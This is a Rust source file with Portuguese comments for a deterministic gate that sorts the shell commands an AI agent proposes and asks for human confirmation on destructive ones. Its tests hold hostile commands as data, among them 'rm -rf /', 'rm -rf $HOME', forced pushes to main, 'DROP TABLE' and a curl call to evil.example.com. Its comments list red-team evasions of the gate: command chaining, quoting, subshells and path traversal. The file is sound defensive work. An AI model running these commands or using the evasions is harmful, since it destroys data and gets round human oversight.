//! W3-6 — **núcleo determinístico do gate de execução** (autonomia × classe de ação).
//!
//! **Invariante #1 (`CLAUDE.md`):** o app NUNCA chama LLM. Este módulo é 100%
//! pattern-match + tabela. Dado um comando (string) e o nível de autonomia, ele:
//!   1. [`classify`] o comando em uma [`ActionClass`] (`routine`|`gated-soft`|`gated-hard`)
//!      por padrões embutidos (design §1.1);
//!   2. [`decide`] aplica a **matriz canônica** (nível × classe) → [`Decision`]
//!      (`allow`|`ask`|`deny`).
//!
//! O gate **não lê a intenção** do agente — ele intercepta o **comando real** (design
//! §1.3). Aqui vive só a lógica pura; a interceptação (hook `PreToolUse` / PATH-shim) e
//! a custódia de segredo são camadas externas (W3-6 restante), fora do escopo deste núcleo.
//!
//! ## Matriz canônica (design §1.1)
//! | Classe \ Nível | `manual` | `assistido` | `autônomo` |
//! |---|---|---|---|
//! | `routine`     | allow | allow | allow |
//! | `gated-soft`  | ask   | ask   | **allow** (afrouxado) |
//! | `gated-hard`  | ask   | ask   | **ask** (piso — nunca afrouxa) |
//!
//! `gated-hard` confirma em TODOS os níveis: autonomia não é licença para deletar prod,
//! pagar ou enviar a terceiros sem humano. `delegation`/`broadcast` são guardrails do
//! **router** (não deste gate).
//!
//! ## Round 5 — anti-evasão (bypasses ALTA fechados)
//! O pattern-match é endurecido contra 7 evasões que rebaixavam `gated-hard → allow` em autônomo
//! (furando hook E shim, que chamam `classify`): (1) encadeamento `;`/`&&`/`||`/`|`; (2) push em
//! `main` via refspec `HEAD:main`; (3) força via prefixo `+`; (4) `rm -rf $VAR`; (5) aspas em volta
//! do alvo; (6) destino de push expansível (`$branch`/`{a,b}`); (7) `rm -r` (recursivo sem força)
//! em path perigoso. Princípio: **severidade monotônica** — cada regra só ADICIONA hard.

use thiserror::Error;

use crate::router::AutonomyLevel;

/// Classe de uma ação, do ponto de vista do agente (design §1.1).
///
/// **A ORDEM das variantes encoda a SEVERIDADE** (`Routine` < `GatedSoft` < `GatedHard`): o `Ord`
/// derivado é usado por [`classify`] para tomar a classe MAIS SEVERA entre os fragmentos de um
/// comando encadeado (FIX #1). Não reordene as variantes sem reavaliar isso.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum ActionClass {
    /// Local e reversível: ler/editar arquivo no workspace, build, teste, `cargo …`.
    Routine,
    /// Irreversível mas recuperável / escopo-feature: `git push` (branch feature),
    /// `rm` em path do workspace, `git commit --amend`.
    GatedSoft,
    /// Destrutivo OU com custódia de segredo: force-push / push em `main`/`master`,
    /// `rm -rf` fora do workspace, deploy/terraform em prod, pagamento, envio externo,
    /// `DROP`/migração destrutiva.
    GatedHard,
}

impl ActionClass {
    /// String canônica persistida no evento `ActionGated` (`"routine"` etc.).
    #[must_use]
    pub fn as_str(self) -> &'static str {
        match self {
            ActionClass::Routine => "routine",
            ActionClass::GatedSoft => "gated-soft",
            ActionClass::GatedHard => "gated-hard",
        }
    }
}

/// Decisão do gate para uma ação sob um nível de autonomia.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Decision {
    /// Executa sem confirmação.
    Allow,
    /// Pede confirmação humana (sim/não) antes de executar.
    Ask,
    /// Recusa sem oferecer confirmação. (Não usado pela matriz atual — `gated-hard` é
    /// `ask` (piso confirmável), não `deny`; existe para completude do contrato/hook.)
    Deny,
}

impl Decision {
    /// String canônica impressa pelo verbo e persistida no evento (`"allow"` etc.).
    #[must_use]
    pub fn as_str(self) -> &'static str {
        match self {
            Decision::Allow => "allow",
            Decision::Ask => "ask",
            Decision::Deny => "deny",
        }
    }
}

/// Veredito do gate: a classe inferida + a decisão sob a matriz. Ambos vão para o
/// evento `ActionGated` quando a decisão NÃO for `allow`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct GateDecision {
    pub class: ActionClass,
    pub decision: Decision,
}

/// Erro de entrada do gate (nível de autonomia desconhecido).
#[derive(Debug, Error, PartialEq, Eq)]
pub enum GuardError {
    #[error("nível de autonomia desconhecido: {0:?} (use manual|assistido|autonomo)")]
    UnknownAutonomy(String),
}

/// Traduz a string de autonomia (pt-br do `workspace.json` / CLI) para [`AutonomyLevel`].
/// Aceita também os sinônimos em inglês (espelho do enum do core) por robustez.
pub fn parse_autonomy(s: &str) -> Result<AutonomyLevel, GuardError> {
    // `to_lowercase` (Unicode, não ASCII) para casar entrada acentuada: `AUTÔNOMO` → `autônomo`.
    match s.trim().to_lowercase().as_str() {
        "manual" => Ok(AutonomyLevel::Manual),
        "assistido" | "assisted" => Ok(AutonomyLevel::Assisted),
        "autonomo" | "autônomo" | "autonomous" => Ok(AutonomyLevel::Autonomous),
        other => Err(GuardError::UnknownAutonomy(other.to_string())),
    }
}

// ───────────────────────────── ruleset embutido (design §1.1) ─────────────────────────────

/// Tokens-chave (igualdade exata de token, NÃO substring) que classificam um comando como
/// `gated-hard` por si só: deploy/infra de prod, pagamento, envio externo, e-mail.
/// Igualdade de token evita falsos positivos como `cat src/deploy.rs` (token `src/deploy.rs`).
const HARD_KEYWORD_TOKENS: &[&str] = &[
    "deploy", // `npm run deploy`, `lina do deploy`, …
    "payment", "pay", "charge", "stripe",  // pagamento / custódia de segredo
    "webhook", // envio a webhook de terceiro
    "sendmail", "msmtp", // e-mail externo
];

/// Subcomandos destrutivos de ferramentas de infra (`<tool> <verb>`).
const HARD_TOOL_VERBS: &[(&str, &[&str])] = &[
    ("terraform", &["apply", "destroy"]),
    ("kubectl", &["apply", "delete", "drain"]),
];

/// Branches protegidas cujo push direto OU forçado é sempre `gated-hard`.
const PROTECTED_BRANCHES: &[&str] = &["main", "master"];

/// Classifica um comando em [`ActionClass`] por pattern-match determinístico.
///
/// **Prioridade (crítica para segurança):** `gated-hard` é testado ANTES de `gated-soft` (dentro de
/// cada fragmento) — um `git push --force origin main` casa os dois; o piso destrutivo precisa
/// vencer para que `autônomo` jamais afrouxe um force-push.
///
/// Comando não reconhecido → `routine`: o pattern-match é a camada *soft* (admitidamente
/// incompleta — design §1.3); a garantia inquebrável é a custódia de segredo (W0-7).
/// Defaultar desconhecido para `ask` violaria "nunca tela em branco / local rotineiro segue".
#[must_use]
pub fn classify(cmd: &str) -> ActionClass {
    let lower = cmd.to_ascii_lowercase();
    // FIX #1 (encadeamento): um comando shell pode encadear vários via `;`, `&&`, `||`, `|`, `&` e
    // newline. Classificar o token-soup global inteiro mistura os fragmentos — um indicador de força/
    // destino vaza entre comandos (falso-positivo) e, pior, a severidade de um fragmento pode ser
    // diluída (falso-negativo). Então fragmentamos e classificamos CADA pedaço; a classe final é a
    // MAIS SEVERA (`Ord`: Routine < GatedSoft < GatedHard). Monotônico: encadear NUNCA rebaixa.
    split_shell_fragments(&lower)
        .iter()
        .map(|frag| classify_fragment(frag))
        .max()
        .unwrap_or(ActionClass::Routine)
}

/// Classifica UM fragmento de comando (já sem separadores de shell e em minúsculas).
fn classify_fragment(frag: &str) -> ActionClass {
    // FIX #5 (anti-evasão por aspas): remove `"` e `'` antes de tokenizar — `"main"`/`'main'` → main;
    // `"$HOME"` → $HOME; `'/etc'` → /etc. Sem isto, aspas em volta do alvo derrotavam o fix #2
    // (destino do refspec), o fix #4 (`$var`) e a checagem de path do `rm`. Remover os chars é
    // conservador: só APROXIMA de gated-hard (severidade monotônica), nunca esconde perigo.
    let unquoted = frag.replace(['"', '\''], "");
    let tokens: Vec<&str> = unquoted.split_whitespace().collect();
    if tokens.is_empty() {
        return ActionClass::Routine;
    }
    if is_gated_hard(&unquoted, &tokens) {
        ActionClass::GatedHard
    } else if is_gated_soft(&tokens) {
        ActionClass::GatedSoft
    } else {
        ActionClass::Routine
    }
}

/// FIX #1 + FIX L2-1: fragmenta um comando nos separadores de shell (`;`, `&&`, `||`, `|`, `&`,
/// newline) **E** nos delimitadores de subshell/substituição de comando — parêntese `(`/`)` e crase
/// `` ` ``. Assim `$(rm -rf /)`, `` `rm -rf /` ``, `(git push --force origin main)` e `<(curl …)`
/// têm o conteúdo INTERNO extraído como fragmento próprio e classificado (o `$`/`<` que sobra vira um
/// fragmento órfão inócuo). Cada paréntese é fronteira → aninhamento arbitrário é achatado sem
/// recursão. **NÃO** quebra em `$` cru (senão `rm -rf $HOME` perderia o alvo `$HOME` do fix #4).
/// Conservador: sobre-fragmentar só ADICIONA verificações (severidade monotônica), nunca esconde
/// um comando perigoso (os tokens de um sub-comando perigoso ficam juntos DENTRO do seu fragmento).
fn split_shell_fragments(s: &str) -> Vec<&str> {
    s.split([';', '&', '|', '\n', '\r', '(', ')', '`'])
        .map(str::trim)
        .filter(|f| !f.is_empty())
        .collect()
}

/// Aplica a matriz canônica (design §1.1) — função pura, sem I/O.
#[must_use]
pub fn decide(class: ActionClass, autonomy: AutonomyLevel) -> Decision {
    match class {
        // Local-reversível: sempre permitido.
        ActionClass::Routine => Decision::Allow,
        // Soft: confirma em manual/assistido; `autônomo` AFROUXA para auto.
        ActionClass::GatedSoft => match autonomy {
            AutonomyLevel::Autonomous => Decision::Allow,
            AutonomyLevel::Manual | AutonomyLevel::Assisted => Decision::Ask,
        },
        // Hard: piso confirmável em TODOS os níveis (autônomo NUNCA afrouxa).
        ActionClass::GatedHard => Decision::Ask,
    }
}

/// Veredito completo: classifica e decide de uma vez.
#[must_use]
pub fn check_action(cmd: &str, autonomy: AutonomyLevel) -> GateDecision {
    let class = classify(cmd);
    GateDecision {
        class,
        decision: decide(class, autonomy),
    }
}

// ───────────────────────────── classificadores (pattern-match puro) ─────────────────────────────

fn is_gated_hard(lower: &str, tokens: &[&str]) -> bool {
    // 1+2) `git push` perigoso: por FORÇA (flags `--force`/`-f`/`--force-with-lease` OU prefixo `+`
    //      num refspec — FIX #3) OU por DESTINO protegido (`main`/`master`), inclusive via refspec
    //      `src:dst`/`HEAD:main`/`refs/heads/main`/`:main` (FIX #2) ou destino expansível
    //      `$branch`/`{a,b}` (FIX #6). O `contains("main")` por token inteiro perdia tudo isso.
    if is_git_push(tokens) && (has_force_flag(tokens) || push_targets_protected(tokens)) {
        return true;
    }
    // 3) `rm` recursivo OU forçado (FIX #7) em alvo FORA do workspace (absoluto/home/parent/glob raiz
    //    ou VARIÁVEL `$…` — FIX #4).
    if tokens.contains(&"rm") && rm_recursive_or_force(tokens) && has_dangerous_path(tokens) {
        return true;
    }
    // 4) tokens-chave de prod/pagamento/envio externo.
    if tokens.iter().any(|t| HARD_KEYWORD_TOKENS.contains(t)) {
        return true;
    }
    // 5) subcomandos destrutivos de infra (`terraform apply`, `kubectl delete`, …).
    if HARD_TOOL_VERBS
        .iter()
        .any(|(tool, verbs)| tokens.contains(tool) && verbs.iter().any(|v| tokens.contains(v)))
    {
        return true;
    }
    // 6) DROP destrutivo de banco.
    if lower.contains("drop table") || lower.contains("drop database") {
        return true;
    }
    // 7) chamada HTTP a host externo (curl/wget para fora de localhost) = envio externo.
    if (tokens.contains(&"curl") || tokens.contains(&"wget"))
        && lower.contains("http")
        && !lower.contains("localhost")
        && !lower.contains("127.0.0.1")
    {
        return true;
    }
    false
}

fn is_gated_soft(tokens: &[&str]) -> bool {
    // `git push` (já filtrado de force/main pela prioridade) → branch feature = soft.
    if is_git_push(tokens) {
        return true;
    }
    // `git commit --amend` reescreve história (recuperável) = soft.
    if tokens.contains(&"git") && tokens.contains(&"commit") && tokens.contains(&"--amend") {
        return true;
    }
    // `rm` em path do workspace (não-perigoso; o caso perigoso já foi gated-hard) = soft.
    if tokens.contains(&"rm") {
        return true;
    }
    false
}

/// `git push` em qualquer forma (`git push`, `git -C dir push`, `sudo git push`).
fn is_git_push(tokens: &[&str]) -> bool {
    tokens.contains(&"git") && tokens.contains(&"push")
}

/// Força de um `git push`: flags clássicas (`--force`, `-f`, `--force-with-lease`) OU — FIX #3 — o
/// prefixo `+` num refspec (`git push origin +feature:main` força o envio).
fn has_force_flag(tokens: &[&str]) -> bool {
    if tokens
        .iter()
        .any(|t| *t == "--force" || *t == "-f" || t.starts_with("--force-with-lease"))
    {
        return true;
    }
    refspec_tokens(tokens).iter().any(|t| t.starts_with('+'))
}

/// Os tokens de REFSPEC de um `git push`: os posicionais APÓS `push` que não são flags. Inclui o
/// repositório (`origin`/URL) — inofensivo, pois seu "destino" (sufixo) não casa branch protegida
/// nem marcador. Vazio se não há `push`. A análise de força/destino (FIX #2/#3/#6) opera sobre estes.
fn refspec_tokens<'a>(tokens: &[&'a str]) -> Vec<&'a str> {
    let Some(pos) = tokens.iter().position(|t| *t == "push") else {
        return Vec::new();
    };
    tokens[pos + 1..]
        .iter()
        .copied()
        .filter(|t| !t.starts_with('-'))
        .collect()
}

/// FIX #2/#6: `true` se ALGUM refspec do push tem DESTINO protegido — branch protegida (parseando
/// `[+]<src>:<dst>` → após o último `:` e `/`) OU destino EXPANSÍVEL/obscurecido (`$branch`,
/// `{main,feature}`, crase) que não dá para resolver em tempo de classificação → conservadoramente
/// tratado como protegido (pode expandir para main/master). O sufixo limpa repo/URL (sem marcador).
fn push_targets_protected(tokens: &[&str]) -> bool {
    refspec_tokens(tokens).iter().any(|t| {
        let dst = refspec_dest_branch(t);
        PROTECTED_BRANCHES.contains(&dst) || dst.contains(['$', '`', '{', '}'])
    })
}

/// Extrai o nome da branch de DESTINO de um refspec `[+]<src>:<dst>` ou `[+]<ref>`: tira o `+` de
/// força, pega o lado direito do último `:` (o `dst`), e o sufixo após o último `/`
/// (`refs/heads/main` → `main`). Cobre `HEAD:main`, `:main` (delete), `origin/main`, `main`.
fn refspec_dest_branch(refspec: &str) -> &str {
    let no_plus = refspec.strip_prefix('+').unwrap_or(refspec);
    let dst = no_plus.rsplit(':').next().unwrap_or(no_plus);
    dst.rsplit('/').next().unwrap_or(dst)
}

/// `rm` recursivo OU forçado — basta UMA das duas (FIX #7; design furo #4 fala "rm -r/-f"). Combina
/// flags separadas (`-r`, `-f`) e agrupadas (`-rf`/`-fr`). `rm -r /etc` (recursivo sem força) num
/// path perigoso já é destrutivo, então não exige as duas juntas.
fn rm_recursive_or_force(tokens: &[&str]) -> bool {
    let mut recursive = false;
    let mut force = false;
    for t in tokens {
        if !t.starts_with('-') {
            continue;
        }
        if *t == "--recursive" {
            recursive = true;
        }
        if *t == "--force" {
            force = true;
        }
        // flags curtas agrupadas: `-rf`, `-fr`, `-Rf`…
        if !t.starts_with("--") {
            let flags = &t[1..];
            if flags.contains('r') || flags.contains('R') {
                recursive = true;
            }
            if flags.contains('f') {
                force = true;
            }
        }
    }
    recursive || force
}

/// Há um alvo de path FORA do workspace: absoluto (`/…`), home (`~…`), glob de raiz (`*`), VARIÁVEL
/// (`$…` — FIX #4) ou TRAVERSAL `..` em QUALQUER componente (FIX L2-2). Tokens de flag e o próprio
/// `rm`/`sudo` são ignorados.
fn has_dangerous_path(tokens: &[&str]) -> bool {
    tokens.iter().any(|t| {
        if t.starts_with('-') || *t == "rm" || *t == "sudo" {
            return false;
        }
        t.starts_with('/')
            || t.starts_with('~')
            || *t == "*"
            // FIX #4: alvo iniciado por `$` é uma VARIÁVEL (`$HOME`, `$VAR`, `$(...)`) — destino
            // desconhecido em tempo de classificação. Conservador: `rm -r/-f $X` → gated-hard.
            || t.starts_with('$')
            // FIX L2-2: `..` em QUALQUER posição escapa do workspace (`./../etc`, `a/../../etc`),
            // não só como prefixo. Checa componente-a-componente (split por `/`), não `starts_with`.
            || has_parent_traversal(t)
    })
}

/// `true` se algum COMPONENTE do path (separado por `/`) é exatamente `..` — um salto para fora do
/// diretório atual. Diferente de `starts_with("..")`, pega o `..` no meio (`./../etc`) e ignora
/// nomes legítimos que só começam com pontos (`..foo`, um arquivo, não é traversal).
fn has_parent_traversal(t: &str) -> bool {
    t.split('/').any(|c| c == "..")
}

// ───────────────────────────────────── testes ─────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ---- classificação (pattern-match) ----

    #[test]
    fn force_push_to_main_is_gated_hard() {
        assert_eq!(
            classify("git push --force origin main"),
            ActionClass::GatedHard
        );
        assert_eq!(classify("git push -f origin main"), ActionClass::GatedHard);
        assert_eq!(
            classify("git push --force-with-lease origin feature/x"),
            ActionClass::GatedHard
        );
    }

    #[test]
    fn push_to_protected_branch_without_force_is_gated_hard() {
        assert_eq!(classify("git push origin main"), ActionClass::GatedHard);
        assert_eq!(classify("git push origin master"), ActionClass::GatedHard);
    }

    #[test]
    fn push_to_feature_branch_is_gated_soft() {
        assert_eq!(
            classify("git push origin feature/x"),
            ActionClass::GatedSoft
        );
        assert_eq!(classify("git push"), ActionClass::GatedSoft);
    }

    #[test]
    fn commit_amend_is_gated_soft() {
        assert_eq!(
            classify("git commit --amend -m fix"),
            ActionClass::GatedSoft
        );
    }

    #[test]
    fn rm_rf_outside_workspace_is_gated_hard() {
        assert_eq!(classify("rm -rf /"), ActionClass::GatedHard);
        assert_eq!(classify("rm -rf /etc"), ActionClass::GatedHard);
        assert_eq!(classify("sudo rm -rf /var/lib"), ActionClass::GatedHard);
        assert_eq!(classify("rm -rf ~/Documents"), ActionClass::GatedHard);
        assert_eq!(classify("rm -rf ../sibling"), ActionClass::GatedHard);
        assert_eq!(classify("rm -fr /"), ActionClass::GatedHard);
    }

    #[test]
    fn rm_in_workspace_is_gated_soft() {
        assert_eq!(classify("rm -rf build"), ActionClass::GatedSoft);
        assert_eq!(classify("rm ./tmp/file.txt"), ActionClass::GatedSoft);
        assert_eq!(classify("rm note.md"), ActionClass::GatedSoft);
    }

    #[test]
    fn prod_and_external_keywords_are_gated_hard() {
        assert_eq!(classify("terraform apply"), ActionClass::GatedHard);
        assert_eq!(
            classify("terraform destroy -auto-approve"),
            ActionClass::GatedHard
        );
        assert_eq!(classify("kubectl delete pod x"), ActionClass::GatedHard);
        assert_eq!(classify("npm run deploy"), ActionClass::GatedHard);
        assert_eq!(classify("stripe payments create"), ActionClass::GatedHard);
        assert_eq!(
            classify("curl -X POST https://api.terceiro.com/webhook"),
            ActionClass::GatedHard
        );
        assert_eq!(
            classify("psql -c 'DROP TABLE users'"),
            ActionClass::GatedHard
        );
    }

    #[test]
    fn routine_commands_are_routine() {
        assert_eq!(classify("cargo test"), ActionClass::Routine);
        assert_eq!(classify("cargo build --workspace"), ActionClass::Routine);
        assert_eq!(
            classify("cargo clippy -- -D warnings"),
            ActionClass::Routine
        );
        assert_eq!(classify("git status"), ActionClass::Routine);
        assert_eq!(classify("git diff"), ActionClass::Routine);
        assert_eq!(classify("git commit -m wip"), ActionClass::Routine);
        assert_eq!(classify("cat src/deploy.rs"), ActionClass::Routine); // 'deploy' como substring NÃO conta
        assert_eq!(classify("ls -la"), ActionClass::Routine);
        assert_eq!(
            classify("curl http://localhost:8080/health"),
            ActionClass::Routine
        ); // local
    }

    // ---- matriz (nível × classe) ----

    #[test]
    fn matrix_routine_allows_everywhere() {
        for lvl in [
            AutonomyLevel::Manual,
            AutonomyLevel::Assisted,
            AutonomyLevel::Autonomous,
        ] {
            assert_eq!(decide(ActionClass::Routine, lvl), Decision::Allow);
        }
    }

    #[test]
    fn matrix_gated_soft_confirms_except_autonomous() {
        assert_eq!(
            decide(ActionClass::GatedSoft, AutonomyLevel::Manual),
            Decision::Ask
        );
        assert_eq!(
            decide(ActionClass::GatedSoft, AutonomyLevel::Assisted),
            Decision::Ask
        );
        assert_eq!(
            decide(ActionClass::GatedSoft, AutonomyLevel::Autonomous),
            Decision::Allow,
            "autônomo afrouxa gated-soft para auto"
        );
    }

    #[test]
    fn matrix_gated_hard_confirms_at_every_level() {
        for lvl in [
            AutonomyLevel::Manual,
            AutonomyLevel::Assisted,
            AutonomyLevel::Autonomous,
        ] {
            assert_eq!(
                decide(ActionClass::GatedHard, lvl),
                Decision::Ask,
                "gated-hard é piso confirmável — autônomo NUNCA afrouxa"
            );
        }
    }

    // ---- AC-6.2 (núcleo) ----

    #[test]
    fn ac_6_2_force_push_main_is_ask_even_in_autonomous() {
        let v = check_action("git push --force origin main", AutonomyLevel::Autonomous);
        assert_eq!(v.class, ActionClass::GatedHard);
        assert_eq!(
            v.decision,
            Decision::Ask,
            "force-push em main NUNCA é allow"
        );
    }

    #[test]
    fn ac_6_2_cargo_test_is_allow() {
        let v = check_action("cargo test", AutonomyLevel::Manual);
        assert_eq!(v.class, ActionClass::Routine);
        assert_eq!(v.decision, Decision::Allow);
    }

    #[test]
    fn ac_6_2_feature_push_loosens_only_in_autonomous() {
        assert_eq!(
            check_action("git push origin feature/x", AutonomyLevel::Assisted).decision,
            Decision::Ask
        );
        assert_eq!(
            check_action("git push origin feature/x", AutonomyLevel::Autonomous).decision,
            Decision::Allow
        );
    }

    #[test]
    fn ac_6_2_rm_rf_root_never_allow() {
        for lvl in [
            AutonomyLevel::Manual,
            AutonomyLevel::Assisted,
            AutonomyLevel::Autonomous,
        ] {
            assert_ne!(check_action("rm -rf /", lvl).decision, Decision::Allow);
        }
    }

    // ---- parse de autonomia ----

    #[test]
    fn parse_autonomy_accepts_ptbr_and_rejects_garbage() {
        assert_eq!(parse_autonomy("manual"), Ok(AutonomyLevel::Manual));
        assert_eq!(parse_autonomy("assistido"), Ok(AutonomyLevel::Assisted));
        assert_eq!(parse_autonomy("autonomo"), Ok(AutonomyLevel::Autonomous));
        assert_eq!(parse_autonomy("AUTÔNOMO"), Ok(AutonomyLevel::Autonomous));
        assert!(parse_autonomy("ludico").is_err());
    }

    // ════════════ ROUND 5: 7 bypasses ALTA fechados ════════════
    // Cada um, em QUALQUER nível (incl. autônomo), tem de ser `ask` — NUNCA `allow`. O hook
    // PreToolUse e o PATH-shim chamam este `classify`, então fechá-lo fecha os dois. Os fixes #1-#4
    // são os 4 furos da story; #5-#7 são endurecimentos confirmados pelo red-team adversarial.

    /// Helper: a decisão no nível mais permissivo (autônomo) é `ask`?
    fn ask_in_autonomous(cmd: &str) -> bool {
        check_action(cmd, AutonomyLevel::Autonomous).decision == Decision::Ask
    }

    /// FIX #1 — encadeamento (`;`/`&&`/`||`/`|`/newline): severidade = a MAIS SEVERA entre fragmentos.
    #[test]
    fn fix1_command_chaining_takes_most_severe_fragment() {
        assert_eq!(
            classify("git add . && git push --force origin main"),
            ActionClass::GatedHard
        );
        assert!(ask_in_autonomous(
            "git add . && git push --force origin main"
        ));
        assert_eq!(
            classify("git push --force origin main ; ls"),
            ActionClass::GatedHard
        );
        assert_eq!(classify("ls || rm -rf /"), ActionClass::GatedHard);
        assert_eq!(
            classify("cat x | git push origin HEAD:main"),
            ActionClass::GatedHard
        );
        assert!(ask_in_autonomous("echo ok && rm -rf $HOME"));
        // encadeamento legítimo continua routine (não over-bloqueia).
        assert_eq!(classify("cargo build && cargo test"), ActionClass::Routine);
        assert_eq!(
            classify("git add . && git commit -m wip"),
            ActionClass::Routine
        );
    }

    /// FIX #2 — push em branch protegida via REFSPEC (`HEAD:main`, `refs/heads/main`, `:main`).
    #[test]
    fn fix2_push_to_protected_via_refspec_is_gated_hard() {
        for cmd in [
            "git push origin HEAD:main",
            "git push origin HEAD:master",
            "git push origin feature:main",
            "git push origin feature:master",
            "git push origin refs/heads/main",
            "git push origin :main", // delete da main
        ] {
            assert_eq!(classify(cmd), ActionClass::GatedHard, "{cmd}");
            assert!(ask_in_autonomous(cmd), "{cmd} deve ser ask em autônomo");
        }
        // destino feature (não-protegido) continua soft → allow em autônomo.
        assert_eq!(
            classify("git push origin HEAD:feature/x"),
            ActionClass::GatedSoft
        );
        assert_eq!(
            check_action("git push origin HEAD:feature/x", AutonomyLevel::Autonomous).decision,
            Decision::Allow
        );
    }

    /// FIX #3 — força via prefixo `+` no refspec (`+feature:main`, `+main`), não detectada por flag.
    #[test]
    fn fix3_force_via_plus_prefix_is_gated_hard() {
        for cmd in [
            "git push origin +feature:main",
            "git push origin +feature:feature2", // force p/ qualquer branch é hard
            "git push origin +main",
        ] {
            assert_eq!(classify(cmd), ActionClass::GatedHard, "{cmd}");
            assert!(ask_in_autonomous(cmd), "{cmd}");
        }
    }

    /// FIX #4 — `rm -rf $VAR`: alvo por variável é destino desconhecido → conservadoramente hard.
    #[test]
    fn fix4_rm_rf_variable_target_is_gated_hard() {
        for cmd in ["rm -rf $HOME", "rm -rf $VAR/sub", "rm -fr $(cat path.txt)"] {
            assert_eq!(classify(cmd), ActionClass::GatedHard, "{cmd}");
        }
        for lvl in [
            AutonomyLevel::Manual,
            AutonomyLevel::Assisted,
            AutonomyLevel::Autonomous,
        ] {
            assert_ne!(check_action("rm -rf $HOME", lvl).decision, Decision::Allow);
        }
    }

    /// FIX #5 (red-team) — ASPAS em volta do alvo não podem derrotar os fixes #2/#4 nem o path do rm.
    #[test]
    fn fix5_quoting_does_not_evade_gate() {
        for cmd in [
            "git push origin \"main\"",
            "git push origin 'main'",
            "git push origin \"HEAD:main\"",
            "rm -rf \"$HOME\"",
            "rm -rf '/etc'",
            "rm -rf \"/etc\"",
        ] {
            assert_eq!(classify(cmd), ActionClass::GatedHard, "{cmd}");
            assert!(ask_in_autonomous(cmd), "{cmd}");
        }
        // aspas em destino feature continua soft (não over-bloqueia).
        assert_eq!(
            classify("git push origin \"feature/x\""),
            ActionClass::GatedSoft
        );
    }

    /// FIX #6 (red-team) — destino de push EXPANSÍVEL/obscurecido (`$branch`, `{main,feature}`) →
    /// conservadoramente hard (pode expandir p/ main). Repo/URL com `$` no token NÃO causa falso+.
    #[test]
    fn fix6_obscured_push_destination_is_gated_hard() {
        for cmd in [
            "git push origin $branch",
            "git push origin ${branch}",
            "git push origin {main,feature}",
            "git push origin HEAD:$target",
        ] {
            assert_eq!(classify(cmd), ActionClass::GatedHard, "{cmd}");
            assert!(ask_in_autonomous(cmd), "{cmd}");
        }
        // destino feature limpo continua soft; URL com credencial-var no REPO não vira falso-positivo.
        assert_eq!(
            classify("git push https://$ci@host/repo.git feature"),
            ActionClass::GatedSoft
        );
    }

    /// FIX #7 (red-team) — `rm -r` (recursivo SEM força) em path perigoso já é hard (basta -r OU -f).
    #[test]
    fn fix7_rm_recursive_only_on_dangerous_path_is_gated_hard() {
        assert_eq!(classify("rm -r /etc"), ActionClass::GatedHard);
        assert_eq!(classify("rm -r ~/x"), ActionClass::GatedHard);
        assert_eq!(classify("rm -f /etc/passwd"), ActionClass::GatedHard); // força em path perigoso
        assert!(ask_in_autonomous("rm -r /etc"));
        // recursivo/forçado DENTRO do workspace continua soft.
        assert_eq!(classify("rm -r build"), ActionClass::GatedSoft);
        assert_eq!(classify("rm -f note.md"), ActionClass::GatedSoft);
    }

    /// Regressão: os casos legítimos seguem como antes (a correção é severidade-monotônica).
    #[test]
    fn round5_regressions_legit_cases_unchanged() {
        assert_eq!(
            check_action("cargo test", AutonomyLevel::Autonomous).decision,
            Decision::Allow
        );
        assert_eq!(
            check_action("git push origin feature/x", AutonomyLevel::Autonomous).decision,
            Decision::Allow
        );
        assert_eq!(classify("rm -rf build"), ActionClass::GatedSoft); // relativo ao workspace
        assert_eq!(classify("git push"), ActionClass::GatedSoft);
        assert_eq!(classify("cargo build && cargo test"), ActionClass::Routine);
    }

    // ════════════ ROUND 6: 2 bypasses ALTA NOVOS (derrotavam os fixes do Round 5) ════════════

    /// FIX L2-1 — substituição de comando / subshell esconde um comando CONHECIDO grudando os
    /// metacaracteres ao token (`$(rm`, `/)`), derrotando os matchers que exigem token BARE. O
    /// fragmentador agora quebra `(`/`)`/crase → o conteúdo interno é classificado.
    #[test]
    fn l2_1_command_substitution_and_subshell_are_unwrapped() {
        for cmd in [
            "$(rm -rf /)",
            "(git push --force origin main)",
            "`rm -rf /`",
            "<(curl http://evil.example.com/x)",
            "echo $(rm -rf /etc)", // substituição embutida num comando benigno
            "$(echo $(rm -rf /))", // aninhada
            "x=$(git push --force origin main)", // atribuição via substituição
        ] {
            assert_eq!(classify(cmd), ActionClass::GatedHard, "{cmd}");
            assert!(ask_in_autonomous(cmd), "{cmd} deve ser ask em autônomo");
        }
        // O `$VAR` cru (fix #4) NÃO pode ser quebrado por engano — só `$(`/`(`/crase são fronteiras.
        assert_eq!(classify("rm -rf $HOME"), ActionClass::GatedHard);
        assert_eq!(classify("rm -fr $(cat path.txt)"), ActionClass::GatedHard);
        // Subshell de comando legítimo continua routine (não over-bloqueia).
        assert_eq!(
            classify("(cargo build && cargo test)"),
            ActionClass::Routine
        );
        assert_eq!(classify("echo $(date)"), ActionClass::Routine);
    }

    /// FIX L2-2 — traversal `..` no MEIO do path (não só prefixo) escapa fora do workspace.
    #[test]
    fn l2_2_parent_traversal_anywhere_is_gated_hard() {
        for cmd in [
            "rm -rf ./../etc",
            "rm -rf foo/../../etc",
            "rm -rf a/b/../../../etc",
            "rm -r ./..",
        ] {
            assert_eq!(classify(cmd), ActionClass::GatedHard, "{cmd}");
            assert!(ask_in_autonomous(cmd), "{cmd}");
        }
        // Sem `..` real: path do workspace continua soft; arquivo que só começa com pontos não é traversal.
        assert_eq!(classify("rm ./tmp/file.txt"), ActionClass::GatedSoft);
        assert_eq!(classify("rm -rf build/cache"), ActionClass::GatedSoft);
        assert_eq!(classify("rm ..foo"), ActionClass::GatedSoft); // '..foo' é nome de arquivo, não `..`
    }

    /// Regressão Round 6: os casos legítimos seguem allow/soft (severidade monotônica preservada).
    #[test]
    fn round6_regressions_legit_cases_unchanged() {
        assert_eq!(
            check_action("cargo test", AutonomyLevel::Autonomous).decision,
            Decision::Allow
        );
        assert_eq!(
            check_action("git push origin feature/x", AutonomyLevel::Autonomous).decision,
            Decision::Allow
        );
        assert_eq!(
            check_action("rm ./tmp/file.txt", AutonomyLevel::Autonomous).decision,
            Decision::Allow
        );
        // fix #4 (rm -rf $VAR) e fix #1 (encadeamento) seguem hard sob os novos splits.
        assert_eq!(classify("rm -rf $HOME"), ActionClass::GatedHard);
        assert_eq!(
            classify("git add . && git push --force origin main"),
            ActionClass::GatedHard
        );
